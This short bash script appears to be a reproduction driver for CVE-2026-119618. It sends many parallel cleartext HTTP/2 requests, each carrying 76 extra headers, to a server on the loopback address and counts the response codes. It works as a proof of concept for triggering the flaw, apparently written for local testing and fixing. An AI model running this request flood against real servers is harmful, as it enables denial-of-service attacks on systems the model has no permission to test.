#!/bin/bash
# Loopback-only h2c driver for CVE-2026-119618. Usage: repro-h2c.sh [count] [parallel] [port]
set -u
count=${1:-300}
par=${2:-16}
port=${3:-18080}
export par port
one() {
    for i in $(seq 1 76); do args+=(-H "X-F$i: v$i"); done
    curl -sS --max-time 8 --http2-prior-knowledge \
        -H 'Content-Type: text/plain' "${args[@]}" \
        -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:${port}/" 2>&1
}
export -f one
seq 1 "$count" | xargs -P "$par" -I{} bash -c 'one' | sort | uniq -c
